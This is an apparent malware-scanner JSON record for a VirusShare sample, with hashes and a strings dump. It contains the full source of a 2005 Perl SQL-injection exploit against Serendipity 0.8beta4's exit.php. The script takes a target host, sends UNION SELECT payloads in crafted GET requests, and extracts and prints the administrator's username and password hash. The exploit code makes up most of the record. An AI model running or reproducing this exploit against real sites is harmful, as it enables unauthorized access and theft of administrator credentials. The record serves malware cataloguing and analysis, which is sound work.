{
    "docinfo": {
        "attributes": [],
        "behavior": {},
        "macro": "#!/usr/bin/perl\n# Serendipity 0.8beta4 exit.php SQL Injection exploit\n# (c) ADZ Security Team 2004-2005\n# (c) kreon 2005\n# http://adz.void.ru/\n# kre0n@mail.ru\n# Public :)\n\nprint \"\\n\\n\";\nprint \"# Serendipity 0.8beta4 exit.php SQL Injection exploit\\n\";\nprint \"# (C) ADZ Security Team 2004-2005\\n\";\nprint \"# (C) kreon 2005\\n\";\n\nuse IO::Socket;\nuse Getopt::Std;\n\ngetopt(\"h:d:p:t:\");\n\n$opt_p ||= 80;\n$opt_d ||= \"/\";\n$opt_t ||= \"serendipity_\";\n\nif(!$opt_h) {\n    die(\"# Usage: $0 -h <host> [-d <dir>] [-p <port>] [-t \ntable_prefix]\\n\");\n}\n\n$sqlpass = \"?entry_id=1&url_id=1%20UNION%20SELECT%20password\n   %20FROM%20\".$opt_t.\"authors%20WHERE%20userlevel=255/*\";\n$sqllogin = \"?entry_id=1&url_id=1%20UNION%20SELECT%20username\n   %20FROM%20\".$opt_t.\"authors%20WHERE%20userlevel=255/*\";\n\nprint \"# Host: $opt_h\\n\";\nprint \"# Dir: $opt_d\\n\";\nprint \"# Port: $opt_p\\n\";\nprint \"# Prefix: $opt_t\\n\";\n\n$Q1 = \"GET \".$opt_d.\"/exit.php\".$sqllogin.\" HTTP/1.0\\n\";\n$Q1 .= \"Host: \".$opt_h.\"\\n\\n\";\n\n$Q2 = \"GET \".$opt_d.\"/exit.php\".$sqlpass.\" HTTP/1.0\\n\";\n$Q2 .= \"Host: \".$opt_h.\"\\n\\n\";\n\n$s = IO::Socket::INET->new(Proto => 'tcp', PeerAddr => $opt_h, PeerPort => \n$opt_p) or die(\"Can't connect!\");\n$s->send($Q1);\n$s->recv($txt, 1024);\nif($txt =~ m/location: (\\S+)/i) {\n    $login =  $1;\n}\n\n$s = IO::Socket::INET->new(Proto=>'tcp', PeerAddr => $opt_h, PeerPort => \n$opt_p) or die(\"Can't connect!\");\n$s->send($Q2);\n$s->recv($txt, 1024);\nif($txt =~ m/location: (\\S+)/i) {\n    $pass = $1;\n}\nif(!$login || !$pass || $login =~ m/http:\\/\\//i || $pass =~ m/http:\\/\\//i) \n{\n    print \"# Failed :(\\n\";\n    exit;\n}\n\nprint \"# Succeed :)\\n\";\nprint \"# Login: $login\\n\";\nprint \"# Pass Hash: $pass\\n\";\nprint \"\\n\";"
    },
    "filename": "VirusShare_0ee376f8f253b9c5f3b941c150810c3d",
    "filesize": 1735,
    "filetype": "Perl script text executable",
    "hashes": {
        "md5": "0ee376f8f253b9c5f3b941c150810c3d",
        "sha1": "80ec485663500d42e5d16e24b75e02825789ed38",
        "sha256": "5053988a54f86aa7f72f0351b36252c443402fb2a65bb4c6a2a1fd74075bb5a0"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "# Serendipity 0.8beta4 exit.php SQL Injection exploit",
            "# (c) ADZ Security Team 2004-2005",
            "# (c) kreon 2005",
            "# http://adz.void.ru/",
            "# kre0n@mail.ru",
            "# Public :)",
            "print \"\\n\\n\";",
            "print \"# Serendipity 0.8beta4 exit.php SQL Injection exploit\\n\";",
            "print \"# (C) ADZ Security Team 2004-2005\\n\";",
            "print \"# (C) kreon 2005\\n\";",
            "use IO::Socket;",
            "use Getopt::Std;",
            "getopt(\"h:d:p:t:\");",
            "$opt_p ||= 80;",
            "$opt_d ||= \"/\";",
            "$opt_t ||= \"serendipity_\";",
            "if(!$opt_h) {",
            "    die(\"# Usage: $0 -h <host> [-d <dir>] [-p <port>] [-t ",
            "table_prefix]\\n\");",
            "$sqlpass = \"?entry_id=1&url_id=1%20UNION%20SELECT%20password",
            "   %20FROM%20\".$opt_t.\"authors%20WHERE%20userlevel=255/*\";",
            "$sqllogin = \"?entry_id=1&url_id=1%20UNION%20SELECT%20username",
            "   %20FROM%20\".$opt_t.\"authors%20WHERE%20userlevel=255/*\";",
            "print \"# Host: $opt_h\\n\";",
            "print \"# Dir: $opt_d\\n\";",
            "print \"# Port: $opt_p\\n\";",
            "print \"# Prefix: $opt_t\\n\";",
            "$Q1 = \"GET \".$opt_d.\"/exit.php\".$sqllogin.\" HTTP/1.0\\n\";",
            "$Q1 .= \"Host: \".$opt_h.\"\\n\\n\";",
            "$Q2 = \"GET \".$opt_d.\"/exit.php\".$sqlpass.\" HTTP/1.0\\n\";",
            "$Q2 .= \"Host: \".$opt_h.\"\\n\\n\";",
            "$s = IO::Socket::INET->new(Proto => 'tcp', PeerAddr => $opt_h, PeerPort => ",
            "$opt_p) or die(\"Can't connect!\");",
            "$s->send($Q1);",
            "$s->recv($txt, 1024);",
            "if($txt =~ m/location: (\\S+)/i) {",
            "    $login =  $1;",
            "$s = IO::Socket::INET->new(Proto=>'tcp', PeerAddr => $opt_h, PeerPort => ",
            "$opt_p) or die(\"Can't connect!\");",
            "$s->send($Q2);",
            "$s->recv($txt, 1024);",
            "if($txt =~ m/location: (\\S+)/i) {",
            "    $pass = $1;",
            "if(!$login || !$pass || $login =~ m/http:\\/\\//i || $pass =~ m/http:\\/\\//i) ",
            "    print \"# Failed :(\\n\";",
            "    exit;",
            "print \"# Succeed :)\\n\";",
            "print \"# Login: $login\\n\";",
            "print \"# Pass Hash: $pass\\n\";",
            "print \"\\n\";"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://adz.void.ru/"
        ]
    },
    "time": "0:00:00.293418",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
